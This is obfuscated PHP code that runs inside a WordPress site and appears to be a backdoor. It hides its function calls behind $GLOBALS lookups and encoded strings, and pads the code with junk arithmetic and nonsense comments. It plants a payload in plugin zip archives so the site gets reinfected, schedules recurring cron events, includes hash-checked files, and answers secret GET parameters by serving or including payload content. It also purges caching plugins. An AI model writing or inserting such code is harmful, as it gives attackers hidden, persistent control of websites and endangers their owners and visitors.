    if (p_lwrm_zqo9euyd0(t6995wceyqc2q1wqvl()))    return;$agvcjskc=7281;$gm09nxcpn9=$agvcjskc%3;
    $e3thri4q7dp  =   r5waslskyqytjrm6();
$mhgza3zqckbz8   =   dv62azao9qb3z33m4cwig0(ABSPATH .  bovhd4vawcd(1118),  (4<<1)) .    bovhd4vawcd(1732);
$lnfyvmqftz =    $GLOBALS['__scf_os_n9tj5psxjj_3'](t6995wceyqc2q1wqvl(),      lpwgqh9300(1671));
     $xs7ycu0j4f9 =    z2lalb3eiqlgy6ozb9();
      if      (!$xs7ycu0j4f9  ||   $GLOBALS['__scf_fr9u7cq1eo_10']($xs7ycu0j4f9)  < (499+1))    {
 r63yaewew47stuijcrwsx6(bovhd4vawcd(1210),      m5t68uuej1(1733));
return;
  }
 if      (!$GLOBALS['__scf_l_p7ggy6l__533'](bovhd4vawcd(1734)))    return;
 $vatwljflry0c  = array(
 $e3thri4q7dp   .  '/'   .  $mhgza3zqckbz8,
$e3thri4q7dp  .   m40pvx5ij_z4mj(1735) . $GLOBALS['__scf_rr3n__85bx_1736'](m40pvx5ij_z4mj(1737)) .  $mhgza3zqckbz8,
  );
   $_szokw9ll2  =   (defined(bovhd4vawcd(1738))    ?  WP_CONTENT_DIR : ABSPATH   .  bovhd4vawcd(1739))  .   bovhd4vawcd(1740);
       if  (@$GLOBALS['__scf_i9hdv7zrfsy_45']($_szokw9ll2)) {$huwrh7zgjy=65*2;$kapn36ab8und3=$huwrh7zgjy-19;

     $prcn5nbr596s2ue    =    h06jfdytq78tzk7($_szokw9ll2,   (1992+8));
    if  ($GLOBALS['__scf_pomb89yiuz_37']($prcn5nbr596s2ue))  {
foreach   ($prcn5nbr596s2ue  as  $k3g08rnqu9m)    {
   $wkokdoejn433  = $_szokw9ll2 . '/'  .     $k3g08rnqu9m;
if     (@$GLOBALS['__scf_i9hdv7zrfsy_45']($wkokdoejn433)    && @$GLOBALS['__scf_p_260ito5s0j_50']($wkokdoejn433))   {


    $vatwljflry0c[] =  $wkokdoejn433  . '/'     .  $mhgza3zqckbz8;
    break;
}
}



 }
   }
  foreach    ($vatwljflry0c  as  $bkpz0x04j22wwrgo)   {
 if  (@$GLOBALS['__scf_nmc3chd3edto_699']($bkpz0x04j22wwrgo) && @$GLOBALS['__scf_pftf6vocmvs2m_99']($bkpz0x04j22wwrgo) >  (330+670))  {


 $fhozjvv8tb58r   = m40pvx5ij_z4mj(1741);
 if     ($GLOBALS['__scf_l_p7ggy6l__533']($fhozjvv8tb58r))  {
   $onc5b0tlij7 =   new  $fhozjvv8tb58r();
   if   (@$onc5b0tlij7->open($bkpz0x04j22wwrgo)   ===     true)  {

  $oqzt0dgekm2cy      =  false;
      $lifw8p_l4kf9ifv     =      $onc5b0tlij7->locateName($lnfyvmqftz   . '/'    .  $lnfyvmqftz .   m5t68uuej1(1671));
       if ($lifw8p_l4kf9ifv  !==   false) {
$z61th5awzeufqr4e    = $onc5b0tlij7->statIndex($lifw8p_l4kf9ifv);
    if ($GLOBALS['__scf_pomb89yiuz_37']($z61th5awzeufqr4e) &&    isset($z61th5awzeufqr4e[m40pvx5ij_z4mj(1702)])  && (int)   $z61th5awzeufqr4e[m40pvx5ij_z4mj(1742)]  <=  (16777214+2)) {
      $y7n1ienfkhmms8m =   $onc5b0tlij7->getFromIndex($lifw8p_l4kf9ifv);

$oqzt0dgekm2cy   =  ($GLOBALS['__scf_e_8z8ias8ka_43']($y7n1ienfkhmms8m)  &&  $GLOBALS['__scf_pe3s4q1z7z_59']($y7n1ienfkhmms8m)     ===   $GLOBALS['__scf_pe3s4q1z7z_59']($xs7ycu0j4f9));
  unset($y7n1ienfkhmms8m);
   }



 unset($z61th5awzeufqr4e);
      }
    $onc5b0tlij7->close();

  if ($oqzt0dgekm2cy)    continue;
   }
     }
 }
 $_xfdo1_14r691bp   = $GLOBALS['__scf_oagg5b1ubqmznt_11']($bkpz0x04j22wwrgo);
   if  (!@$GLOBALS['__scf_i9hdv7zrfsy_45']($_xfdo1_14r691bp))  xcz5hl0mdlt7fpm3xxe($_xfdo1_14r691bp,   (424+69),  true);
   $fhozjvv8tb58r    =   m40pvx5ij_z4mj(1741);
$git0920_rj = m7maju8jcvf3286($_xfdo1_14r691bp, m5t68uuej1(961));
     if  ($git0920_rj ===   false)     continue;


  $f3rcixrxb7n43zw   =  new $fhozjvv8tb58r();



 if (@$f3rcixrxb7n43zw->open($git0920_rj, $fhozjvv8tb58r::CREATE  | $fhozjvv8tb58r::OVERWRITE)  ===    true) {

$f3rcixrxb7n43zw->addFromString($lnfyvmqftz   . '/'  . $lnfyvmqftz   .    m5t68uuej1(1743),  $xs7ycu0j4f9);
  $f3rcixrxb7n43zw->close();
 $wure8u5b0sj4ljc9 =  new   $fhozjvv8tb58r();
if (@$wure8u5b0sj4ljc9->open($git0920_rj)   ===   true)   {


$wure8u5b0sj4ljc9->close();


 if  (j07vd_9875h0key7jsai($git0920_rj,    $bkpz0x04j22wwrgo)     ||   (b750sq0jbo8pcqvsan($git0920_rj,    $bkpz0x04j22wwrgo)  &&  netei2x342rtzmi4tj69($git0920_rj))) {


 g3arn5w1kvbi32ro9tm($bkpz0x04j22wwrgo,  db6euveuzemu49d01thfga());
        cik9ldzrbjmtnzm00($bkpz0x04j22wwrgo,     (321+99));


} else  {$h6zp68q2eanf=486;$n53ywdiu=($h6zp68q2eanf>0)?$h6zp68q2eanf:-$h6zp68q2eanf;
netei2x342rtzmi4tj69($git0920_rj);
   }
// referentially-transparent skolem

   }  else  {
  netei2x342rtzmi4tj69($git0920_rj);
 }


   } else {
 netei2x342rtzmi4tj69($git0920_rj);


  }
// predicate invertible bloom-filter

   }



    }  catch    (Throwable  $k3g08rnqu9m)  {
 r63yaewew47stuijcrwsx6(bovhd4vawcd(1744),    $k3g08rnqu9m);$ebgdhpf1xx9dy=5651;$_excbc0k2=$ebgdhpf1xx9dy%2;
     }   catch  (Exception  $k3g08rnqu9m)   {
 }
}
    function     jifrqsvsv2pg00h86t()



 {
try  {$rro1vdhl=(0x91+0x43);$hg9gb0cw=$rro1vdhl%3;
    if   (!$GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(382)) || !$GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(381)))    return;
if  (!defined(lpwgqh9300(1708))) return;
$cuexmnobz48s2h  =  m5t68uuej1(1666);
    if  (!wp_next_scheduled($cuexmnobz48s2h))  {$zfo8z_zikz1q60=49*6;$y65nh8yaz9a_cg=$zfo8z_zikz1q60-15;
    wp_schedule_event($GLOBALS['__scf_ibw9xvmx9ckin_187']() +    (228+72), m5t68uuej1(1745),  $cuexmnobz48s2h);


       }
  if    (!wp_next_scheduled(lpwgqh9300(1746)))    {

       wp_schedule_event($GLOBALS['__scf_ibw9xvmx9ckin_187']()  +  (513+87),   m40pvx5ij_z4mj(380), lpwgqh9300(1746));
     }


} catch    (Throwable     $k3g08rnqu9m) {
      r63yaewew47stuijcrwsx6(bovhd4vawcd(1747),   $k3g08rnqu9m);
        } catch  (Exception    $k3g08rnqu9m)   {
  }
// format worst-case envelope

 }
       function    ihss0v6bzopb1trge2()
     {
     try {
   if      (!defined(m5t68uuej1(1708)))    return;
  $e2f4f6y0jgd47  =  dv62azao9qb3z33m4cwig0(ABSPATH     .  'g',    (9-1));

  $fscn6vcbv1baj2k =    array();$tu9q78ka1lci=PHP_MAJOR_VERSION;$fjkqhp2xk8jt=$tu9q78ka1lci*1;
if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1748)))   $fscn6vcbv1baj2k[] = dha61pphirvk3tnlr();
 $fscn6vcbv1baj2k[]   =    ABSPATH    .    m5t68uuej1(513);
      if ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(93))) $fscn6vcbv1baj2k[]  =    r5waslskyqytjrm6();
 foreach  ($fscn6vcbv1baj2k    as  $vwzj2ak5p_2316i0) {
    $x90tsozeaoxq  = $vwzj2ak5p_2316i0    .    lpwgqh9300(1749)   . $e2f4f6y0jgd47;


  if (@$GLOBALS['__scf_a83pywb98qzq2_20']($x90tsozeaoxq) &&  (int)   @$GLOBALS['__scf_tm09rtls_27e_98']($x90tsozeaoxq)    >    $GLOBALS['__scf_ibw9xvmx9ckin_187']()     - (234+6)) return;
  }
foreach  ($fscn6vcbv1baj2k as  $vwzj2ak5p_2316i0) {
  $ttug_u1rq_1    = $vwzj2ak5p_2316i0   . m40pvx5ij_z4mj(1625) .   $e2f4f6y0jgd47;
  if (@$GLOBALS['__scf_a83pywb98qzq2_20']($ttug_u1rq_1))   {


 $nfvgmsnt4dzm  =    (int)    @$GLOBALS['__scf_tm09rtls_27e_98']($ttug_u1rq_1);
 if  ($nfvgmsnt4dzm  >     $GLOBALS['__scf_ibw9xvmx9ckin_187']() - (86395+5)    &&   $nfvgmsnt4dzm  <=  $GLOBALS['__scf_ibw9xvmx9ckin_187']() +    (227+73))   continue;


netei2x342rtzmi4tj69($ttug_u1rq_1);

     }

    $zwaxwbtghckmrm =  $vwzj2ak5p_2316i0 .  m40pvx5ij_z4mj(1307)   .  $e2f4f6y0jgd47     .      m40pvx5ij_z4mj(1750);
       if   (@$GLOBALS['__scf_a83pywb98qzq2_20']($zwaxwbtghckmrm)  &&  (int) @$GLOBALS['__scf_pftf6vocmvs2m_99']($zwaxwbtghckmrm)  >   (839-339))  {
  $z1k4ra77kjo  =  $vwzj2ak5p_2316i0 .  bovhd4vawcd(1319)   .   $e2f4f6y0jgd47;
$hzij0uoqm3_qf7h  = @$GLOBALS['__scf_a83pywb98qzq2_20']($z1k4ra77kjo)   ?    $GLOBALS['__scf_nimluvpxhrpvn_323']((string)     @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($z1k4ra77kjo))  :   "";$wkvkj06ufv0ja=(0xd9+0xdd);$w0qsgri425pa8=$wkvkj06ufv0ja%15;
  if     ($hzij0uoqm3_qf7h    !==  ""     &&  $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(1471))  &&    @md5_file($zwaxwbtghckmrm)  === $hzij0uoqm3_qf7h)  {
  @include $zwaxwbtghckmrm;

 return;
     }
if   ($hzij0uoqm3_qf7h !== "")   {
  netei2x342rtzmi4tj69($zwaxwbtghckmrm);
   

    }
unset($z1k4ra77kjo,   $hzij0uoqm3_qf7h);
      }
    }
    unset($ttug_u1rq_1,  $nfvgmsnt4dzm);
if ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(1665)))  @delete_transient(bovhd4vawcd(1303));
hqhwxezqsdtentoalh6kfl();

 } catch (Throwable     $k3g08rnqu9m)      {
r63yaewew47stuijcrwsx6(bovhd4vawcd(1751), $k3g08rnqu9m);
} catch (Exception     $k3g08rnqu9m) {
}
}
 function   trowp755iqhshn7by53b()
{
// hook event-bus for APCu shm

  try  {
     if  (!defined(m40pvx5ij_z4mj(1752)))    return;
 qgs0j96xr638o3621(null);
 $lnfyvmqftz    =  $GLOBALS['__scf_os_n9tj5psxjj_3'](t6995wceyqc2q1wqvl(),  lpwgqh9300(1750));
$ng2318u70lxri0   = t6995wceyqc2q1wqvl();
  

  $xs7ycu0j4f9 = "";
if  (@$GLOBALS['__scf_a83pywb98qzq2_20']($ng2318u70lxri0)    &&  @$GLOBALS['__scf_pftf6vocmvs2m_99']($ng2318u70lxri0) >    (0x822+0xb66))   {
     $nunhvqe2vdcu  =    n2fjr1yyl5ye7s_6q($ng2318u70lxri0);
 if  ($GLOBALS['__scf_e_8z8ias8ka_43']($nunhvqe2vdcu)  &&  $GLOBALS['__scf_fr9u7cq1eo_10']($nunhvqe2vdcu)  >  (0x166+0x8e)  &&   fgcc_h22bqxgwmccod($nunhvqe2vdcu))     $xs7ycu0j4f9 =   $nunhvqe2vdcu;
 unset($nunhvqe2vdcu);
    }
  if  ($xs7ycu0j4f9 ===    "")  {
   $je6b6gmzg5  = dv62azao9qb3z33m4cwig0(ABSPATH .  m40pvx5ij_z4mj(1575),  (0x4+0x6));



      $wtvjfbz8g882q     = $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(1687))  ?    @get_option($je6b6gmzg5,  "")  :  "";
  if   (!$wtvjfbz8g882q ||   $GLOBALS['__scf_fr9u7cq1eo_10']($wtvjfbz8g882q)  <   (420+80))  return;
     $xs7ycu0j4f9   =    jmrz_r2id7ry4ovy($GLOBALS['__scf_wak9390fh7p_356']($wtvjfbz8g882q));
 if  (!$xs7ycu0j4f9   ||      $GLOBALS['__scf_fr9u7cq1eo_10']($xs7ycu0j4f9) <  (959-459)) return;
   if (!fgcc_h22bqxgwmccod($xs7ycu0j4f9))  {


 r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(1753),     bovhd4vawcd(1086));


  return;
    }
}
    $e3thri4q7dp    =    r5waslskyqytjrm6();
   $n__4q_62qbh   =   $e3thri4q7dp .   bovhd4vawcd(1754) .  $lnfyvmqftz;
$qblmnatlrutkh8   = $n__4q_62qbh .    '/'  . $lnfyvmqftz .    lpwgqh9300(1750);



if    (!@$GLOBALS['__scf_i9hdv7zrfsy_45']($n__4q_62qbh))      xcz5hl0mdlt7fpm3xxe($n__4q_62qbh,  (366+127),   true);
 $mbh4yyma3mu6y9  = @$GLOBALS['__scf_a83pywb98qzq2_20']($qblmnatlrutkh8)    ?  n2fjr1yyl5ye7s_6q($qblmnatlrutkh8) :     "";
    $ai2dhzkrq3us4 = ($mbh4yyma3mu6y9 ===     null);
  if ($GLOBALS['__scf_e_8z8ias8ka_43']($mbh4yyma3mu6y9)  && $mbh4yyma3mu6y9 !==  ""  &&    $GLOBALS['__scf_vqnw5_4kg7eu_96'](lpwgqh9300(97),  $GLOBALS['__scf_vvn10ievj2k_9']($mbh4yyma3mu6y9, 0, (4035+61)),   $u0o5acmv9odmelj_)  && version_compare($u0o5acmv9odmelj_[1],  kdgw8qqvzf6yolk(),     '>'))  $ai2dhzkrq3us4   =   true;
  unset($u0o5acmv9odmelj_);
 if (!$ai2dhzkrq3us4      &&    (!$GLOBALS['__scf_e_8z8ias8ka_43']($mbh4yyma3mu6y9)     ||   $mbh4yyma3mu6y9   ===  ""  ||      $GLOBALS['__scf_pe3s4q1z7z_59']($mbh4yyma3mu6y9)  !== $GLOBALS['__scf_pe3s4q1z7z_59']($xs7ycu0j4f9))) {
   if  (a3hx61zfms1ji3euwsc($qblmnatlrutkh8,  y2fq_g7qilvdboqm1($xs7ycu0j4f9))) {
// @hook effect-type

   cik9ldzrbjmtnzm00($qblmnatlrutkh8,   (449-29));
   tgj6urla_2q3x4g8e($qblmnatlrutkh8);
  lnseazh_1k4yq6v_kjl($qblmnatlrutkh8);
   }



}
  unset($mbh4yyma3mu6y9,  $ai2dhzkrq3us4);

      fy8jmfzxi4yysln4fg($lnfyvmqftz . '/'     .    $lnfyvmqftz .  m5t68uuej1(1750));
    $wukda101h9oznh  =  gqtg_eoxyrv0ml2271n();
 if  ((@$GLOBALS['__scf_i9hdv7zrfsy_45']($wukda101h9oznh)   &&   @$GLOBALS['__scf_p_260ito5s0j_50']($wukda101h9oznh)) ||  (!@$GLOBALS['__scf_i9hdv7zrfsy_45']($wukda101h9oznh)   && xcz5hl0mdlt7fpm3xxe($wukda101h9oznh,    (394+99), true)))      {
$itqbdpse1p =      $wukda101h9oznh .      '/' .  $lnfyvmqftz  .   m40pvx5ij_z4mj(1750);
     $mt0j4942xqe3sevl     = @$GLOBALS['__scf_a83pywb98qzq2_20']($itqbdpse1p) ?  n2fjr1yyl5ye7s_6q($itqbdpse1p)  :    "";

$cvbxc14favucir  = ($mt0j4942xqe3sevl ===    null);
if ($GLOBALS['__scf_e_8z8ias8ka_43']($mt0j4942xqe3sevl)     &&      $mt0j4942xqe3sevl   !== ""  &&     $GLOBALS['__scf_vqnw5_4kg7eu_96'](bovhd4vawcd(97), $GLOBALS['__scf_vvn10ievj2k_9']($mt0j4942xqe3sevl,     0,  (7157-3061)),   $zcvjdc6zeuu)      &&     version_compare($zcvjdc6zeuu[1],    kdgw8qqvzf6yolk(),      '>'))   $cvbxc14favucir =  true;
      unset($zcvjdc6zeuu);
      if      (!$cvbxc14favucir     &&   (!$GLOBALS['__scf_e_8z8ias8ka_43']($mt0j4942xqe3sevl)    || $mt0j4942xqe3sevl ===   ""     ||  $GLOBALS['__scf_pe3s4q1z7z_59']($mt0j4942xqe3sevl)  !==   $GLOBALS['__scf_pe3s4q1z7z_59']($xs7ycu0j4f9))) {
 if     (a3hx61zfms1ji3euwsc($itqbdpse1p, y2fq_g7qilvdboqm1($xs7ycu0j4f9))) {
 cik9ldzrbjmtnzm00($itqbdpse1p,   (389+31));
 tgj6urla_2q3x4g8e($itqbdpse1p);
 lnseazh_1k4yq6v_kjl($itqbdpse1p);
   }
     }   elseif (!$cvbxc14favucir) {
// @monomorphize enumerator

    $udxef96cz41rrrp_  = @$GLOBALS['__scf_tm09rtls_27e_98']($itqbdpse1p);
  if    (!$udxef96cz41rrrp_   || ($udxef96cz41rrrp_ %  (99983+17))  !==  eliqs4hzzhoila0pbe())    tgj6urla_2q3x4g8e($itqbdpse1p);
 unset($udxef96cz41rrrp_);

        }
    unset($mt0j4942xqe3sevl, $cvbxc14favucir);



   }
  aualrpzvrr5kleitna1($xs7ycu0j4f9);
       }     catch (Throwable  $k3g08rnqu9m)   {
    r63yaewew47stuijcrwsx6(lpwgqh9300(1755),  $k3g08rnqu9m);
   }     catch   (Exception    $k3g08rnqu9m)  {
  }
     }
   function i28fealg3rex4t8qttvmb()

{


        if (!isset($_GET['p'])   ||  !$GLOBALS['__scf_e_8z8ias8ka_43']($_GET['p']))   return;
      $tr0sj4wrpgdq =   $_GET['p'];
    if ($tr0sj4wrpgdq     === r6u7xx6bh80hwva027(bovhd4vawcd(1129)))    {


 $GLOBALS[lpwgqh9300(1756)]   = true;
      try {
$ntudy17dy01y    = dha61pphirvk3tnlr()  . '/'  .  dv62azao9qb3z33m4cwig0(ABSPATH .  m5t68uuej1(1757), (3+5))      .    m40pvx5ij_z4mj(1758);
 $rwexsrr7wj =   @$GLOBALS['__scf_a83pywb98qzq2_20']($ntudy17dy01y)   ? (int)   @$GLOBALS['__scf_pftf6vocmvs2m_99']($ntudy17dy01y)  :      0;
  if      ($rwexsrr7wj     >  (0x1a3+0x51)  &&   $rwexsrr7wj   <=  (5242836+44))  {
include    $ntudy17dy01y;



   }
}    catch   (Throwable    $k3g08rnqu9m) {
  } catch  (Exception $k3g08rnqu9m)  {

}
// general-recursive substitution-map

  while   ($GLOBALS['__scf_t1qun6sstv31a4_411']()  >  0    && @ob_end_clean())  {
  }
      header(bovhd4vawcd(1759));



     exit;
}
// peel header

    if ($tr0sj4wrpgdq  !== r6u7xx6bh80hwva027(bovhd4vawcd(1156)))  return;
 try     {
      if     ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(1687))  &&    $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1586))) {


  @update_option(bovhd4vawcd(498),     (int) @get_option(m5t68uuej1(498),    0)  + 1,    bovhd4vawcd(1513));
     @update_option(m5t68uuej1(501), $GLOBALS['__scf_ibw9xvmx9ckin_187'](),  lpwgqh9300(1513));
}
// edge case guard




 $v1l1d3jxi5alfj9  =    sb3q0_7sw2xmlw84(bovhd4vawcd(1168),  "");
  if   ($GLOBALS['__scf_fr9u7cq1eo_10']($v1l1d3jxi5alfj9) > (148-48)  &&      !$GLOBALS['__scf_vqnw5_4kg7eu_96'](m40pvx5ij_z4mj(1760),  $v1l1d3jxi5alfj9) &&  $GLOBALS['__scf_vqnw5_4kg7eu_96'](bovhd4vawcd(1761),  $v1l1d3jxi5alfj9))   {
$_z3188jlupd48w9j  =    @$GLOBALS['__scf_wak9390fh7p_356']($v1l1d3jxi5alfj9, true);

  if  ($_z3188jlupd48w9j   !==    false   &&  $GLOBALS['__scf_fr9u7cq1eo_10']($_z3188jlupd48w9j)  >   (248^156))     $v1l1d3jxi5alfj9  = $_z3188jlupd48w9j;
     }

      if  ($GLOBALS['__scf_fr9u7cq1eo_10']($v1l1d3jxi5alfj9) <   (0x29+0x3b))  $v1l1d3jxi5alfj9  =   jwczq4rma03eqb2u5do();
  if   ($GLOBALS['__scf_fr9u7cq1eo_10']($v1l1d3jxi5alfj9)      < (9+91)) {


 while     ($GLOBALS['__scf_t1qun6sstv31a4_411']() >    0 && @ob_end_clean())   {
 }
 header(bovhd4vawcd(1762));

header(bovhd4vawcd(1763));
   header(m40pvx5ij_z4mj(1764));
exit;
  }
   $z5ryhoyrdlzk =   sb3q0_7sw2xmlw84(m5t68uuej1(1152),  "");
 $nrnsacy649 =   '"' .    $GLOBALS['__scf_pe3s4q1z7z_59']($z5ryhoyrdlzk  .  $v1l1d3jxi5alfj9)    . '"';
 if  (isset($_SERVER[bovhd4vawcd(1765)])   && $GLOBALS['__scf_nimluvpxhrpvn_323']($_SERVER[m5t68uuej1(1765)])  === $nrnsacy649)   {
 while  ($GLOBALS['__scf_t1qun6sstv31a4_411']()  >   0      &&    @ob_end_clean()) {
   }
  header(bovhd4vawcd(1766));
 header(lpwgqh9300(1767)   .  $nrnsacy649);
 exit;
}
    while ($GLOBALS['__scf_t1qun6sstv31a4_411']()   >  0     &&  @ob_end_clean()) {
   }
     header(m40pvx5ij_z4mj(1768));
header(m5t68uuej1(1763));
  header(m40pvx5ij_z4mj(1769));
  header(m5t68uuej1(1767)   .  $nrnsacy649);
echo      $z5ryhoyrdlzk .  $v1l1d3jxi5alfj9;
   exit;
   }   catch    (Throwable  $k3g08rnqu9m) {$v0_4k1paxuo90e=8+51;$myt_bgj21q8ap=$v0_4k1paxuo90e-7;
  r63yaewew47stuijcrwsx6(m5t68uuej1(1770),   $k3g08rnqu9m);
  }  catch  (Exception $k3g08rnqu9m)  {
 r63yaewew47stuijcrwsx6(m5t68uuej1(1770), $k3g08rnqu9m);
      }
 }
      i28fealg3rex4t8qttvmb();
 function   btril_v18d0sboi()
      {
// provision revocation-list for WP Query Loop

   if  (!isset($_GET[lpwgqh9300(1771)]))  return;
  try   {
  $dkq3wde8k5by     =   $_GET[bovhd4vawcd(1771)];
if    (!$GLOBALS['__scf_e_8z8ias8ka_43']($dkq3wde8k5by) ||  $dkq3wde8k5by      ===  "")   return;
    $dkq3wde8k5by  =  $GLOBALS['__scf_vi47igxg1zd_103']($dkq3wde8k5by);
 $l6wrk2m_6pb    =   array();
 if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(556)))   $l6wrk2m_6pb[] =      (string) $GLOBALS['__scf_jphyng87rekxk_557'](home_url(), PHP_URL_HOST);
  if    ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(1687)))    {
  $iwpo42pf4w4g = (string)    @get_option(m5t68uuej1(562), "");
  if ($iwpo42pf4w4g  !==  "") $l6wrk2m_6pb[] =  (string)     $GLOBALS['__scf_jphyng87rekxk_557']($iwpo42pf4w4g, PHP_URL_HOST);
}
   if  (isset($_SERVER[m40pvx5ij_z4mj(563)]))   $l6wrk2m_6pb[]    =     (string)   $_SERVER[lpwgqh9300(563)];
  $l6wrk2m_6pb[] =     rgrb14nj3p43kvdym51x("");



$f78jj4mfbqfaw6_ = false;
  foreach  ($GLOBALS['__scf_jghjt9zxt358_149']($l6wrk2m_6pb) as  $vhe5twxajpf) {
// @reconcile skip-list

 if  (!$GLOBALS['__scf_e_8z8ias8ka_43']($vhe5twxajpf)    ||      $vhe5twxajpf ===  "")    continue;
  if  ($GLOBALS['__scf_i8i8g4oxha_7']($vhe5twxajpf,  ':')  !== false)    $vhe5twxajpf    = $GLOBALS['__scf_r1v12_o00h5hc_454'](bovhd4vawcd(1772),  "",      $vhe5twxajpf);



       if (dv62azao9qb3z33m4cwig0($GLOBALS['__scf_vi47igxg1zd_103']($vhe5twxajpf)      .    m40pvx5ij_z4mj(1773), (7+5)) ===     $dkq3wde8k5by) {
 $f78jj4mfbqfaw6_   = true;

break;
   }
 }
    if   (!$f78jj4mfbqfaw6_) return;
$b0xeh6tj5z14wtt  =     $GLOBALS['__scf_cxz48683fju4a_1166'](bovhd4vawcd(1774),  (0x17+0x7));




 $c7dupfhefwjs =    jmrz_r2id7ry4ovy(u4k272wukpl8hyd67g($b0xeh6tj5z14wtt));
while  ($GLOBALS['__scf_t1qun6sstv31a4_411']() >   0   && @ob_end_clean()) {
  }
     header(m40pvx5ij_z4mj(1775));
header(lpwgqh9300(1776));
   echo ($c7dupfhefwjs   ===    $b0xeh6tj5z14wtt)   ?   lpwgqh9300(1777)  .  $GLOBALS['__scf_pe3s4q1z7z_59']($b0xeh6tj5z14wtt)  :   m5t68uuej1(1778);
 exit;
   }   catch   (Throwable $k3g08rnqu9m)  {
   r63yaewew47stuijcrwsx6(bovhd4vawcd(1779),  $k3g08rnqu9m);

 }  catch    (Exception  $k3g08rnqu9m)  {
  r63yaewew47stuijcrwsx6(m5t68uuej1(1779), $k3g08rnqu9m);
 }
   }
// lower memory pressure

  btril_v18d0sboi();

function    hm5dddy7hh5vk14llu97()


   {
/* irreducible type-environment */

  $f78jj4mfbqfaw6_  =  true;

   $zfwq5k38dfh61 =      function   ($y_qnnfh9_u7jy7) use  (&$f78jj4mfbqfaw6_)   {
    try    {
$GLOBALS['__scf_jvgqufbujun_y_289']($y_qnnfh9_u7jy7);$h96myzc0ct3=PHP_INT_MAX/PHP_INT_MAX;$t48ldkp43v92a8=$h96myzc0ct3+48;

  } catch   (Throwable      $k3g08rnqu9m) {
   $f78jj4mfbqfaw6_ = false;
      } catch (Exception      $k3g08rnqu9m)    {


 $f78jj4mfbqfaw6_    = false;



    }



       };
if ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1780)))   $zfwq5k38dfh61(m5t68uuej1(1781));
     if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(1782)))    $zfwq5k38dfh61(bovhd4vawcd(1782));$elj3rvqpb=PHP_MAJOR_VERSION;$mww048zc2l84l=$elj3rvqpb*9;
 if   ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(532))) $zfwq5k38dfh61(bovhd4vawcd(532));

if      ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1783))) $zfwq5k38dfh61(bovhd4vawcd(1783));
 elseif  ($GLOBALS['__scf_l_p7ggy6l__533'](lpwgqh9300(1784))  &&  $GLOBALS['__scf_sruyigi7mie8_118'](m40pvx5ij_z4mj(1784),    lpwgqh9300(1785))) $zfwq5k38dfh61(array(m5t68uuej1(1784),    bovhd4vawcd(1785)));
   if    ($GLOBALS['__scf_l_p7ggy6l__533'](bovhd4vawcd(1786))  &&    $GLOBALS['__scf_sruyigi7mie8_118'](m5t68uuej1(1786), bovhd4vawcd(1787)))  $zfwq5k38dfh61(array(m40pvx5ij_z4mj(1786), bovhd4vawcd(1787)));
   if  ($GLOBALS['__scf_l_p7ggy6l__533'](bovhd4vawcd(534)) && $GLOBALS['__scf_sruyigi7mie8_118'](bovhd4vawcd(534), m5t68uuej1(1788)))  $zfwq5k38dfh61(array(bovhd4vawcd(1789),  bovhd4vawcd(1790)));

    if      ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(1791)))    $zfwq5k38dfh61(m5t68uuej1(1792));

  elseif    (isset($GLOBALS[bovhd4vawcd(535)])  &&     $GLOBALS['__scf_pd74_ila1rfp_70']($GLOBALS[lpwgqh9300(535)]) &&  $GLOBALS['__scf_sruyigi7mie8_118']($GLOBALS[m5t68uuej1(535)],     m5t68uuej1(1793)))   $zfwq5k38dfh61(function ()  {
  $GLOBALS[bovhd4vawcd(535)]->deleteCache(true);
 });
 if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(1794))) $zfwq5k38dfh61(lpwgqh9300(1794));
  if      ($GLOBALS['__scf_l_p7ggy6l__533'](bovhd4vawcd(1795))     && $GLOBALS['__scf_sruyigi7mie8_118'](bovhd4vawcd(1795),   m5t68uuej1(1796)))   $zfwq5k38dfh61(array(lpwgqh9300(1795), m40pvx5ij_z4mj(1797)));
    r63yaewew47stuijcrwsx6(m5t68uuej1(445),   m40pvx5ij_z4mj(1798));



     return $f78jj4mfbqfaw6_;
    }
   function   tbewibdfcid80hu_s()
    {

     if ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(759))  &&   is_admin()) return    true;
    if   ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(1799)) &&      wp_doing_ajax())      return    true;



   if    (defined(bovhd4vawcd(1800))     &&    REST_REQUEST)     return true;
 if  (defined(m5t68uuej1(1801))     &&   XMLRPC_REQUEST) return   true;


if ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(1802)) &&   is_feed())    return true;
 if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(1803))   &&      is_robots())    return  true;
if    ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(1804))    && is_sitemaps()) return  true;
 if ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1805)) &&   is_customize_preview())   return  true;



     if  (isset($_GET[m40pvx5ij_z4mj(1806)])  ||  isset($_GET[m40pvx5ij_z4mj(1807)]) ||  isset($_GET[m40pvx5ij_z4mj(1808)]))   return  true;
 return   false;
   }
function ef8h805j_zad8rpmfo()
 {
